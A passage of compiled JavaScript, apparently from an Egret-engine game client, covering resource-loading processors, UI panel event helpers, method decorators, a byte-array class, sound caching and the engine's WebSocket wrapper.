        var fontGetTexturePath = function (url, fntText) {
            var file = "";
            var lines = fntText.split("\n");
            var pngLine = lines[2];
            var index = pngLine.indexOf("file=\"");
            if (index != -1) {
                pngLine = pngLine.substring(index + 6);
                index = pngLine.indexOf("\"");
                file = pngLine.substring(0, index);
            }
            url = url.split("\\").join("/");
            var index = url.lastIndexOf("/");
            if (index != -1) {
                url = url.substring(0, index + 1) + file;
            }
            else {
                url = file;
            }
            return url;
        };
        processor_1.FontProcessor = {
            onLoadStart: function (host, resource) {
                return host.load(resource, 'text').then(function (data) {
                    var config;
                    try {
                        config = JSON.parse(data);
                    }
                    catch (e) {
                        config = data;
                    }
                    var imageName;
                    if (typeof config === 'string') {
                        imageName = fontGetTexturePath(resource.url, config);
                    }
                    else {
                        imageName = getRelativePath(resource.url, config.file);
                    }
                    var r = host.resourceConfig.getResource(RES.nameSelector(imageName));
                    if (!r) {
                        r = { name: imageName, url: imageName, type: 'image', root: resource.root };
                    }
                    return host.load(r).then(function (texture) {
                        var font = new egret.BitmapFont(texture, config);
                        font["$resourceInfo"] = r;
                        host.save(r, texture);
                        return font;
                    }, function (e) {
                        host.remove(r);
                        throw e;
                    });
                });
            },
            onRemoveStart: function (host, resource) {
                var font = host.get(resource);
                var r = font["$resourceInfo"];
                host.unload(r);
            }
        };
        processor_1.SoundProcessor = {
            onLoadStart: function (host, resource) {
                var sound = new egret.Sound();
                sound.load(RES.getVirtualUrl(resource.root + resource.url));
                return promisify(sound, resource).then(function () {
                    return sound;
                });
            },
            onRemoveStart: function (host, resource) {
                var sound = host.get(resource);
                sound.close();
            }
        };
        processor_1.MovieClipProcessor = {
            onLoadStart: function (host, resource) {
                var mcData;
                var imageResource;
                return host.load(resource, 'json')
                    .then(function (value) {
                    mcData = value;
                    var jsonPath = resource.name;
                    var imagePath = jsonPath.substring(0, jsonPath.lastIndexOf(".")) + ".png";
                    imageResource = host.resourceConfig.getResource(imagePath);
                    if (!imageResource) {
                        throw new RES.ResourceManagerError(1001, imagePath);
                    }
                    return host.load(imageResource);
                }).then(function (value) {
                    host.save(imageResource, value);
                    var mcTexture = value;
                    var mcDataFactory = new egret.MovieClipDataFactory(mcData, mcTexture);
                    return mcDataFactory;
                });
            },
            onRemoveStart: function (host, resource) {
                var mcFactory = host.get(resource);
                mcFactory.clearCache();
                mcFactory.$spriteSheet.dispose();
                var jsonPath = resource.name;
                var imagePath = jsonPath.substring(0, jsonPath.lastIndexOf(".")) + ".png";
                var imageResource = host.resourceConfig.getResource(imagePath);
                if (imageResource) {
                    host.unload(imageResource);
                }
            }
        };
        processor_1.MergeJSONProcessor = {
            onLoadStart: function (host, resource) {
                return host.load(resource, 'json').then(function (data) {
                    for (var key in data) {
                        RES.config.addSubkey(key, resource.name);
                    }
                    return data;
                });
            },
            getData: function (host, resource, key, subkey) {
                var data = host.get(resource);
                if (data) {
                    return data[subkey];
                }
                else {
                    console.error("missing resource :" + resource.name);
                    return null;
                }
            },
            onRemoveStart: function (host, resource) {
            }
        };
        processor_1.TTFProcessor = {
            onLoadStart: function (host, resource) {
                return host.load(resource, "bin").then(function (data) {
                    if (egret.Capabilities.runtimeType == egret.RuntimeType.WEB) {
                        if (!egret.sys.fontResourceCache) {
                            egret.sys.fontResourceCache = {};
                        }
                        egret.sys.fontResourceCache[resource.root + resource.url] = data;
                    }
                });
            },
            onRemoveStart: function (host, resource) {
                if (egret.Capabilities.runtimeType == egret.RuntimeType.WEB) {
                    var fontResCache = egret.sys.fontResourceCache;
                    if (fontResCache && fontResCache[resource.url]) {
                        fontResCache[resource.root + resource.url] = null;
                    }
                }
            }
        };
        processor_1.LegacyResourceConfigProcessor = {
            onLoadStart: function (host, resource) {
                return host.load(resource, 'json').then(function (data) {
                    var resConfigData = RES.config.config;
                    var root = resource.root;
                    var fileSystem = resConfigData.fileSystem;
                    if (!fileSystem) {
                        fileSystem = {
                            fsData: {},
                            getFile: function (filename) {
                                return fsData[filename];
                            },
                            addFile: function (data) {
                                if (!data.type)
                                    data.type = "";
                                if (root == undefined) {
                                    data.root = "";
                                }
                                fsData[data.name] = data;
                            },
                            profile: function () {
                                console.log(fsData);
                            },
                            removeFile: function (filename) {
                                delete fsData[filename];
                            }
                        };
                        resConfigData.fileSystem = fileSystem;
                    }
                    var groups = resConfigData.groups;
                    for (var _i = 0, _a = data.groups; _i < _a.length; _i++) {
                        var g = _a[_i];
                        if (g.keys == "") {
                            groups[g.name] = [];
                        }
                        else {
                            groups[g.name] = g.keys.split(",");
                        }
                    }
                    var alias = resConfigData.alias;
                    var fsData = fileSystem['fsData'];
                    var _loop_1 = function (resource_1) {
                        fsData[resource_1.name] = resource_1;
                        fsData[resource_1.name].root = root;
                        if (resource_1.subkeys) {
                            resource_1.subkeys.split(",").forEach(function (subkey) {
                                alias[subkey] = resource_1.name + "#" + subkey;
                                alias[resource_1.name + "." + subkey] = resource_1.name + "#" + subkey;
                            });
                        }
                    };
                    for (var _b = 0, _c = data.resources; _b < _c.length; _b++) {
                        var resource_1 = _c[_b];
                        _loop_1(resource_1);
                    }
                    host.save(resource, data);
                    return data;
                });
            },
            onRemoveStart: function () {
            }
        };
        processor_1._map = {
            "image": processor_1.ImageProcessor,
            "json": processor_1.JsonProcessor,
            "text": processor_1.TextProcessor,
            "xml": processor_1.XMLProcessor,
            "sheet": processor_1.SheetProcessor,
            "font": processor_1.FontProcessor,
            "bin": processor_1.BinaryProcessor,
            "commonjs": processor_1.CommonJSProcessor,
            "sound": processor_1.SoundProcessor,
            "movieclip": processor_1.MovieClipProcessor,
            "mergeJson": processor_1.MergeJSONProcessor,
            "legacyResourceConfig": processor_1.LegacyResourceConfigProcessor,
            "ktx": processor_1.KTXTextureProcessor,
            "etc1.ktx": processor_1.ETC1KTXProcessor,
            "pvrtc.ktx": processor_1.KTXTextureProcessor,
            "ttf": processor_1.TTFProcessor
        };
    })(processor = RES.processor || (RES.processor = {}));
})(RES || (RES = {}));
var RES;
(function (RES) {
    var ResourceItem;
    (function (ResourceItem) {
        ResourceItem.TYPE_XML = "xml";
        ResourceItem.TYPE_IMAGE = "image";
        ResourceItem.TYPE_BIN = "bin";
        ResourceItem.TYPE_TEXT = "text";
        ResourceItem.TYPE_JSON = "json";
        ResourceItem.TYPE_SHEET = "sheet";
        ResourceItem.TYPE_FONT = "font";
        ResourceItem.TYPE_SOUND = "sound";
        ResourceItem.TYPE_TTF = "ttf";
        function convertToResItem(r) {
            var name = r.name;
            if (!RES.config.config) {
                name = r.url;
            }
            else {
                for (var aliasName in RES.config.config.alias) {
                    if (RES.config.config.alias[aliasName] == r.url) {
                        name = aliasName;
                    }
                }
            }
            var result = {
                name: name,
                url: r.url,
                type: r.type,
                data: r,
                root: r.root
            };
            return result;
        }
        ResourceItem.convertToResItem = convertToResItem;
    })(ResourceItem = RES.ResourceItem || (RES.ResourceItem = {}));
})(RES || (RES = {}));
var RES;
(function (RES) {
    RES.checkNull = function (target, propertyKey, descriptor) {
        var method = descriptor.value;
        descriptor.value = function () {
            var arg = [];
            for (var _i = 0; _i < arguments.length; _i++) {
                arg[_i] = arguments[_i];
            }
            if (!arg[0]) {
                console.warn("\u65B9\u6CD5" + propertyKey + "\u7684\u53C2\u6570\u4E0D\u80FD\u4E3Anull");
                return null;
            }
            else {
                return method.apply(this, arg);
            }
        };
    };
    RES.FEATURE_FLAG = {
        FIX_DUPLICATE_LOAD: 1
    };
    var upgrade;
    (function (upgrade) {
        var _level = "warning";
        function setUpgradeGuideLevel(level) {
            _level = level;
        }
        upgrade.setUpgradeGuideLevel = setUpgradeGuideLevel;
    })(upgrade = RES.upgrade || (RES.upgrade = {}));
})(RES || (RES = {}));
var egret;
(function (egret) {
})(egret || (egret = {}));
var Tween = egret.Tween;
var ArrayCollection = eui.ArrayCollection;
String.prototype["format"] = function (args) {
    var result = this;
    if (arguments.length > 0) {
        if (arguments.length == 1 && typeof (args) == "object") {
            for (var key in args) {
                if (args[key] != undefined) {
                    var reg = new RegExp("({" + key + "})", "g");
                    result = result.replace(reg, args[key]);
                }
            }
        }
        else {
            for (var i = 0; i < arguments.length; i++) {
                if (arguments[i] != undefined) {
                    var reg = new RegExp("({)" + i + "(})", "g");
                    result = result.replace(reg, arguments[i]);
                }
            }
        }
    }
    return result;
};
function callLater(target, key, descriptor) {
    var method = descriptor.value;
    var tkey = "$isLater" + key;
    var newfunc = function () {
        var args = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            args[_i] = arguments[_i];
        }
        delete this[tkey];
        method.call.apply(method, [this].concat(args));
    };
    var newfunc2 = function () {
        var args = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            args[_i] = arguments[_i];
        }
        if (this[tkey])
            return;
        egret.callLater.apply(egret, [newfunc, this].concat(args));
        this[tkey] = true;
    };
    descriptor.value = newfunc2;
    return descriptor;
}
function callDelay(delay) {
    var func = function (target, key, descriptor) {
        var method = descriptor.value;
        var tkey = "$isDelay" + key;
        var newfunc = function () {
            var args = [];
            for (var _i = 0; _i < arguments.length; _i++) {
                args[_i] = arguments[_i];
            }
            this[tkey] = false;
            method.call.apply(method, [this].concat(args));
        };
        var newfunc2 = function () {
            var args = [];
            for (var _i = 0; _i < arguments.length; _i++) {
                args[_i] = arguments[_i];
            }
            if (this[tkey])
                return;
            this[tkey] = true;
            egret.setTimeout.apply(egret, [newfunc, this, delay].concat(args));
        };
        descriptor.value = newfunc2;
        return descriptor;
    };
    return func;
}
function recycle(target) {
    egret.BitmapData.$removeDisplayObject = function (displayObject, bitmapData) {
        if (!bitmapData) {
            return;
        }
        var hashCode = bitmapData.hashCode;
        if (!hashCode) {
            return;
        }
        if (!egret.BitmapData['_displayList'][hashCode]) {
            return;
        }
        var tempList = egret.BitmapData['_displayList'][hashCode];
        var index = tempList.indexOf(displayObject);
        if (index >= 0) {
            tempList.splice(index, 1);
        }
        if (tempList.length == 0) {
            RecycleMgr.ins().disposeResTime(hashCode);
        }
    };
}
function injectable(target) {
}
function protocolsId(id) {
    return function (target) {
        target.prototype.protocolsId = id;
    };
}
function up(id, encode) {
    var func = function (target, key, descriptor) {
        var method = descriptor.value;
        var newfunc = function () {
            var args = [];
            for (var _i = 0; _i < arguments.length; _i++) {
                args[_i] = arguments[_i];
            }
            var param = method.call.apply(method, [this].concat(args));
            if (typeof (param) == "boolean" && !param) {
                return false;
            }
            var bytes = this.getBytes(id);
            if (param && param instanceof Array) {
                this.encodeBytes(encode, param, bytes);
            }
            this.sendToServer(bytes);
            return param;
        };
        descriptor.value = newfunc;
        return descriptor;
    };
    return func;
}
function down(id, decode) {
    return function (target, key, descriptor) {
        var method = descriptor.value;
        method.messageId = id;
        method.decode = decode;
        descriptor.value = method;
        return descriptor;
    };
}
var BasePanel = (function (_super) {
    __extends(BasePanel, _super);
    function BasePanel() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.msgObject = {};
        _this._longPress = [];
        return _this;
    }
    BasePanel.prototype.open = function () {
        var param = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            param[_i] = arguments[_i];
        }
    };
    BasePanel.prototype.close = function () {
        var param = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            param[_i] = arguments[_i];
        }
    };
    BasePanel.prototype.addCustomEvent = function (type, listener) {
        var key = "" + type;
        this.msgObject[key] = true;
        EventMgr.addListener(type, listener, this);
    };
    BasePanel.prototype.removeCustomEvents = function () {
        var keys = Object.keys(this.msgObject);
        if (keys && keys.length) {
            EventMgr.ins().removeAll(this, keys);
            this.msgObject = {};
        }
    };
    BasePanel.prototype.addLongPress = function (obj, func) {
        if (this._longPress.indexOf(obj.hashCode) == -1) {
            this._longPress.push(obj.hashCode);
            LongPressUtils.ins().addLongPress(obj, func, this);
        }
    };
    BasePanel.prototype.removeLongPress = function () {
        var len = this._longPress.length;
        for (var i = 0; len > i; i++) {
            LongPressUtils.ins().removeLongPress(this._longPress[i]);
        }
        this._longPress.length = 0;
    };
    BasePanel.prototype.addEvent = function (ev, obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        if (!obj) {
            debug.error("Not binding object");
            return;
        }
        obj.addEventListener(ev, func, thisObj);
    };
    BasePanel.prototype.removeEvent = function (ev, obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        if (obj) {
            obj.removeEventListener(ev, func, thisObj);
        }
    };
    BasePanel.prototype.addEventTouchTap = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(egret.TouchEvent.TOUCH_TAP, obj, func, thisObj);
    };
    BasePanel.prototype.removeEventTouchTap = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(egret.TouchEvent.TOUCH_TAP, obj, func, thisObj);
    };
    BasePanel.prototype.addEventTouchEnd = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(egret.TouchEvent.TOUCH_END, obj, func, thisObj);
    };
    BasePanel.prototype.removeEventTouchEnd = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(egret.TouchEvent.TOUCH_END, obj, func, thisObj);
    };
    BasePanel.prototype.addEventChange = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        if (obj && obj instanceof eui.TabBar) {
            this.tabClickFunc = this.tabClickFunc || {};
            this.tabClickFunc[obj.hashCode] = func;
            this.addEvent(egret.TouchEvent.CHANGE, obj, this.onChangeTap, this);
        }
        else {
            this.addEvent(egret.TouchEvent.CHANGE, obj, func, thisObj);
        }
    };
    BasePanel.prototype.onChangeTap = function (e) {
        if (this.tabClickFunc[e.currentTarget.hashCode]) {
            this.tabClickFunc[e.currentTarget.hashCode].call(this, e);
        }
    };
    BasePanel.prototype.removeEventChange = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        if (obj && obj instanceof eui.TabBar) {
            this.removeEvent(egret.TouchEvent.CHANGE, obj, this.onChangeTap, this);
        }
        else {
            this.removeEvent(egret.TouchEvent.CHANGE, obj, func, thisObj);
        }
    };
    BasePanel.prototype.addEventChanging = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(egret.TouchEvent.CHANGING, obj, func, thisObj);
    };
    BasePanel.prototype.removeEventChanging = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(egret.TouchEvent.CHANGING, obj, func, thisObj);
    };
    BasePanel.prototype.addEventItemTap = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(eui.ItemTapEvent.ITEM_TAP, obj, func, thisObj);
    };
    BasePanel.prototype.removeEventItemTap = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(eui.ItemTapEvent.ITEM_TAP, obj, func, thisObj);
    };
    BasePanel.prototype.addEventAddedFromStage = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(egret.Event.ADDED_TO_STAGE, obj, func, thisObj);
    };
    BasePanel.prototype.removeEventAddedFromStage = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(egret.Event.ADDED_TO_STAGE, obj, func, thisObj);
    };
    BasePanel.prototype.addEventRemovedFromStage = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(egret.Event.REMOVED_FROM_STAGE, obj, func, thisObj);
    };
    BasePanel.prototype.removeEventRemovedFromStage = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(egret.Event.REMOVED_FROM_STAGE, obj, func, thisObj);
    };
    BasePanel.prototype.addEventTextLink = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(egret.TextEvent.LINK, obj, func, thisObj);
    };
    BasePanel.prototype.removeEventTextLink = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(egret.TextEvent.LINK, obj, func, thisObj);
    };
    BasePanel.prototype.addEventFocusIn = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(egret.FocusEvent.FOCUS_IN, obj, func, thisObj);
    };
    BasePanel.prototype.removeEventFocusIn = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(egret.FocusEvent.FOCUS_IN, obj, func, thisObj);
    };
    BasePanel.prototype.addEventFocusOut = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(egret.FocusEvent.FOCUS_OUT, obj, func, thisObj);
    };
    BasePanel.prototype.removeEventFocusOut = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(egret.FocusEvent.FOCUS_OUT, obj, func, thisObj);
    };
    BasePanel.prototype.addEventTouchBegin = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(egret.TouchEvent.TOUCH_BEGIN, obj, func, thisObj);
    };
    BasePanel.prototype.removeEventTouchBegin = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(egret.TouchEvent.TOUCH_BEGIN, obj, func, thisObj);
    };
    BasePanel.prototype.addEventTouchMove = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(egret.TouchEvent.TOUCH_MOVE, obj, func, thisObj);
    };
    BasePanel.prototype.removeEventTouchMove = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(egret.TouchEvent.TOUCH_MOVE, obj, func, thisObj);
    };
    BasePanel.prototype.addEventChangeStart = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(eui.UIEvent.CHANGE_START, obj, func, thisObj);
    };
    BasePanel.prototype.removeEventChangeStart = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(eui.UIEvent.CHANGE_START, obj, func, thisObj);
    };
    BasePanel.prototype.addEventChangeEnd = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.addEvent(eui.UIEvent.CHANGE_END, obj, func, thisObj);
    };
    BasePanel.prototype.removeEventChangeEnd = function (obj, func, thisObj) {
        if (thisObj === void 0) { thisObj = this; }
        this.removeEvent(eui.UIEvent.CHANGE_END, obj, func, thisObj);
    };
    BasePanel.prototype.$onClose = function () {
        var fun = function (tar) {
            for (var i = 0; i < tar.numChildren; i++) {
                var obj = tar.getChildAt(i);
                if (obj instanceof BasePanel) {
                    obj.$onClose();
                }
                else if (obj instanceof egret.DisplayObjectContainer) {
                    fun(obj);
                }
            }
        };
        fun(this);
        this.removeCustomEvents();
        this.removeLongPress();
    };
    return BasePanel;
}(eui.Component));
__reflect(BasePanel.prototype, "BasePanel", ["IBaseEvent"]);
var SingleClass = (function () {
    function SingleClass() {
    }
    SingleClass.ins = function () {
        var args = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            args[_i] = arguments[_i];
        }
        var QualifiedClass = this;
        if (!this.instance) {
            this.instance = new (QualifiedClass.bind.apply(QualifiedClass, [void 0].concat(args)))();
        }
        return this.instance;
    };
    return SingleClass;
}());
__reflect(SingleClass.prototype, "SingleClass");
var GameByteArray = (function (_super) {
    __extends(GameByteArray, _super);
    function GameByteArray() {
        var _this = _super.call(this) || this;
        _this.endian = egret.Endian.LITTLE_ENDIAN;
        return _this;
    }
    GameByteArray.prototype.writeCmd = function (id, subId) {
        this.writeByte(id);
        this.writeByte(subId);
    };
    GameByteArray.prototype.readString = function () {
        var str = this.readUTF();
        this.position += 1;
        return str;
    };
    GameByteArray.prototype.writeString = function (value) {
        this.writeUTF(value || "");
        this.writeByte(0);
    };
    GameByteArray.prototype.readUnsignedInt64 = function () {
        var i64 = new UInt64(this);
        var str = i64.toString();
        return +str;
    };
    GameByteArray.prototype.writeUnsignedInt64 = function (val) {
        var uint64 = UInt64.stringToUint64(val.toString());
        this.writeUnsignedInt(uint64._lowUint);
        this.writeUnsignedInt(uint64._highUint);
    };
    return GameByteArray;
}(egret.ByteArray));
__reflect(GameByteArray.prototype, "GameByteArray");
var BaseSound = (function () {
    function BaseSound() {
        this._cache = {};
        this._loadingCache = new Array();
        TimerMgr.ins().doTimer(1 * 60 * 1000, 0, this.dealSoundTimer, this);
    }
    BaseSound.prototype.dealSoundTimer = function () {
        var currTime = egret.getTimer();
        var keys = Object.keys(this._cache);
        for (var i = 0, len = keys.length; i < len; i++) {
            var key = keys[i];
            if (!this.checkCanClear(key))
                continue;
            if (currTime - this._cache[key] >= 3 * 60 * 1000) {
                delete this._cache[key];
                RES.destroyRes(key);
            }
        }
    };
    BaseSound.prototype.getSound = function (key) {
        var sound = RES.getRes(key);
        if (sound) {
            if (this._cache[key]) {
                this._cache[key] = egret.getTimer();
            }
        }
        else {
            if (this._loadingCache.indexOf(key) != -1) {
                return null;
            }
            this._loadingCache.push(key);
            RES.getResAsync(key, this.onResourceLoadComplete, this);
        }
        return sound;
    };
    BaseSound.prototype.onResourceLoadComplete = function (data, key) {
        var index = this._loadingCache.indexOf(key);
        if (index != -1) {
            this._loadingCache.splice(index, 1);
            this._cache[key] = egret.getTimer();
            this.loadedPlay(key);
        }
    };
    BaseSound.prototype.loadedPlay = function (key) {
    };
    BaseSound.prototype.checkCanClear = function (key) {
        return true;
    };
    return BaseSound;
}());
__reflect(BaseSound.prototype, "BaseSound");
var RES;
(function (RES) {
    var NativeVersionController = (function () {
        function NativeVersionController() {
        }
        NativeVersionController.prototype.init = function () {
            this.versionInfo = this.getLocalData("all.manifest");
            return Promise.resolve();
        };
        NativeVersionController.prototype.getVirtualUrl = function (url) {
            return url;
        };
        NativeVersionController.prototype.getLocalData = function (filePath) {
            if (egret_native.readUpdateFileSync && egret_native.readResourceFileSync) {
                var content = egret_native.readUpdateFileSync(filePath);
                if (content != null) {
                    return JSON.parse(content);
                }
                content = egret_native.readResourceFileSync(filePath);
                if (content != null) {
                    return JSON.parse(content);
                }
            }
            return null;
        };
        return NativeVersionController;
    }());
    RES.NativeVersionController = NativeVersionController;
    __reflect(NativeVersionController.prototype, "RES.NativeVersionController", ["RES.IVersionController"]);
    if (egret.Capabilities.runtimeType == egret.RuntimeType.NATIVE) {
        RES.VersionController = NativeVersionController;
    }
})(RES || (RES = {}));
var RES;
(function (RES) {
    var __tempCache = {};
    function profile() {
        RES.config.config.fileSystem.profile();
        console.log(__tempCache);
        var totalImageSize = 0;
        for (var key in __tempCache) {
            var img = __tempCache[key];
            if (img instanceof egret.Texture) {
                totalImageSize += img.$bitmapWidth * img.$bitmapHeight * 4;
            }
        }
        console.log("gpu size : " + (totalImageSize / 1024).toFixed(3) + "kb");
    }
    RES.profile = profile;
    RES.host = {
        state: {},
        get resourceConfig() {
            return RES.config;
        },
        load: function (r, processorName) {
            var processor = typeof processorName == 'string' ? RES.processor._map[processorName] : processorName;
            return RES.queue["loadResource"](r, processor);
        },
        unload: function (r) { return RES.queue.unloadResource(r); },
        save: function (resource, data) {
            RES.host.state[resource.root + resource.name] = 2;
            delete resource.promise;
            __tempCache[resource.root + resource.name] = data;
        },
        get: function (resource) {
            return __tempCache[resource.root + resource.name];
        },
        remove: function (resource) {
            delete RES.host.state[resource.root + resource.name];
            delete __tempCache[resource.root + resource.name];
        }
    };
    RES.config = new RES.ResourceConfig();
    RES.queue = new RES.ResourceLoader();
    var ResourceManagerError = (function (_super) {
        __extends(ResourceManagerError, _super);
        function ResourceManagerError(code, replacer, replacer2) {
            var _this = _super.call(this) || this;
            _this.__resource_manager_error__ = true;
            _this.name = code.toString();
            _this.message = ResourceManagerError.errorMessage[code].replace("{0}", replacer).replace("{1}", replacer2);
            return _this;
        }
        ResourceManagerError.errorMessage = {
            1001: '文件加载失败:{0}',
            1002: "ResourceManager 初始化失败：配置文件加载失败",
            2001: "{0}解析失败,不支持指定解析类型:\'{1}\'，请编写自定义 Processor ，更多内容请参见 https://github.com/egret-labs/resourcemanager/blob/master/docs/README.md#processor",
            2002: "Analyzer 相关API 在 ResourceManager 中不再支持，请编写自定义 Processor ，更多内容请参见 https://github.com/egret-labs/resourcemanager/blob/master/docs/README.md#processor",
            2003: "{0}解析失败,错误原因:{1}",
            2004: "无法找到文件类型:{0}",
            2005: "RES加载了不存在或空的资源组:\"{0}\"",
            2006: "资源配置文件中无法找到特定的资源:{0}"
        };
        return ResourceManagerError;
    }(Error));
    RES.ResourceManagerError = ResourceManagerError;
    __reflect(ResourceManagerError.prototype, "RES.ResourceManagerError");
})(RES || (RES = {}));
var egret;
(function (egret) {
    var WebSocket = (function (_super) {
        __extends(WebSocket, _super);
        function WebSocket(host, port) {
            if (host === void 0) { host = ""; }
            if (port === void 0) { port = 0; }
            var _this = _super.call(this) || this;
            _this._writeMessage = "";
            _this._readMessage = "";
            _this._connected = false;
            _this._connecting = false;
            _this._isReadySend = false;
            _this._bytesWrite = false;
            _this._type = WebSocket.TYPE_STRING;
            _this._connected = false;
            _this._writeMessage = "";
            _this._readMessage = "";
            _this.socket = new egret.ISocket();
            _this.socket.addCallBacks(_this.onConnect, _this.onClose, _this.onSocketData, _this.onError, _this);
            return _this;
        }
        WebSocket.prototype.connect = function (host, port, isUrl) {
            if (!this._connecting && !this._connected) {
                this._connecting = true;
                var socketServerUrl = "ws://" + host + ":" + port;
                if (isUrl) {
                    socketServerUrl = "wss://" + host + "/" + port;
                }
                this.socket.connect(host, port, socketServerUrl);
            }
        };
        WebSocket.prototype.close = function () {
            if (this._connected) {
                this.socket.close();
            }
        };
        WebSocket.prototype.onConnect = function () {
            this._connected = true;
            this._connecting = false;
            this.dispatchEventWith(egret.Event.CONNECT);
        };
        WebSocket.prototype.onClose = function (e) {
            this._connected = false;
            var event = new egret.Event(egret.Event.CLOSE);
            event.data = e;
            this.dispatchEvent(event);
        };
        WebSocket.prototype.onError = function (e) {
            if (this._connecting) {
                this._connecting = false;
            }
            var event = new egret.Event(egret.IOErrorEvent.IO_ERROR);
            event.data = e;
            this.dispatchEvent(event);
        };
        WebSocket.prototype.onSocketData = function (message) {
            if (typeof message == "string") {
                this._readMessage += message;
            }
            else {
                this._readByte._writeUint8Array(new Uint8Array(message));
            }
            egret.ProgressEvent.dispatchProgressEvent(this, egret.ProgressEvent.SOCKET_DATA);
        };
        WebSocket.prototype.flush = function () {
            if (!this._connected) {
                egret.$warn(3101);
                return;
            }
            if (this._writeMessage) {
                this.socket.send(this._writeMessage);
                this._writeMessage = "";
            }
            if (this._bytesWrite) {
                this.socket.send(this._writeByte.buffer);
                this._bytesWrite = false;
                this._writeByte.clear();
            }
            this._isReadySend = false;
        };
        WebSocket.prototype.writeUTF = function (message) {
            if (!this._connected) {
                egret.$warn(3101);
                return;
            }
            if (this._type == WebSocket.TYPE_BINARY) {
                this._bytesWrite = true;
                this._writeByte.writeUTF(message);
            }
            else {
                this._writeMessage += message;
            }
            this.flush();
        };
        WebSocket.prototype.readUTF = function () {
            var message;
            if (this._type == WebSocket.TYPE_BINARY) {
                this._readByte.position = 0;
                message = this._readByte.readUTF();
                this._readByte.clear();
            }
            else {
                message = this._readMessage;
                this._readMessage = "";
            }
            return message;
        };
        WebSocket.prototype.writeBytes = function (bytes, offset, length) {
            if (offset === void 0) { offset = 0; }
            if (length === void 0) { length = 0; }
            if (!this._connected) {
                egret.$warn(3101);
                return;
            }
            if (!this._writeByte) {
                egret.$warn(3102);
                return;
            }
            this._bytesWrite = true;
            this._writeByte.writeBytes(bytes, offset, length);
            this.flush();
        };
        WebSocket.prototype.readBytes = function (bytes, offset, length) {
            if (offset === void 0) { offset = 0; }
            if (length === void 0) { length = 0; }
            if (!this._readByte) {
                egret.$warn(3102);
                return;
            }
            this._readByte.position = 0;
            this._readByte.readBytes(bytes, offset, length);
            this._readByte.clear();
        };
        Object.defineProperty(WebSocket.prototype, "connected", {
            get: function () {
                return this._connected;
            },
            enumerable: true,
            configurable: true
        });
        Object.defineProperty(WebSocket.prototype, "type", {
            get: function () {
                return this._type;
            },
            set: function (value) {
                this._type = value;
                if (value == WebSocket.TYPE_BINARY && !this._writeByte) {
                    this._readByte = new egret.ByteArray();
                    this._writeByte = new egret.ByteArray();
                }
            },
            enumerable: true,
            configurable: true
        });
        WebSocket.TYPE_STRING = "webSocketTypeString";
        WebSocket.TYPE_BINARY = "webSocketTypeBinary";
        return WebSocket;
    }(egret.EventDispatcher));
    egret.WebSocket = WebSocket;
    __reflect(WebSocket.prototype, "egret.WebSocket");
})(egret || (egret = {}));
var egret;
(function (egret) {
    var web;
    (function (web) {
        var HTML5WebSocket = (function () {
            function HTML5WebSocket() {
                this.host = "";
                this.port = 0;
                if (!window["WebSocket"]) {
                    egret.$error(3100);
                }
            }
            HTML5WebSocket.prototype.addCallBacks = function (onConnect, onClose, onSocketData, onError, thisObject) {
                this.onConnect = onConnect;
                this.onClose = onClose;
                this.onSocketData = onSocketData;
                this.onError = onError;
                this.thisObject = thisObject;
            };
            HTML5WebSocket.prototype.connect = function (host, port, socketServerUrl) {
                this.host = host;
                this.port = port;
                this.socket = new window["WebSocket"](socketServerUrl);
                this.socket.binaryType = "arraybuffer";
                this._bindEvent();
            };
            HTML5WebSocket.prototype._bindEvent = function () {
                var that = this;
                var socket = this.socket;
                socket.onopen = function () {
                    if (that.onConnect) {
                        that.onConnect.call(that.thisObject);
                    }
                };
                socket.onclose = function (e) {
                    if (that.onClose) {
                        that.onClose.call(that.thisObject, e);
                    }
                };
                socket.onerror = function (e) {
                    if (that.onError) {
                        that.onError.call(that.thisObject, e);
                    }
                };
                socket.onmessage = function (e) {
                    if (that.onSocketData) {
                        if (e.data) {
                            that.onSocketData.call(that.thisObject, e.data);
                        }
                        else {
                            that.onSocketData.call(that.thisObject, e);
                        }
                    }
                };
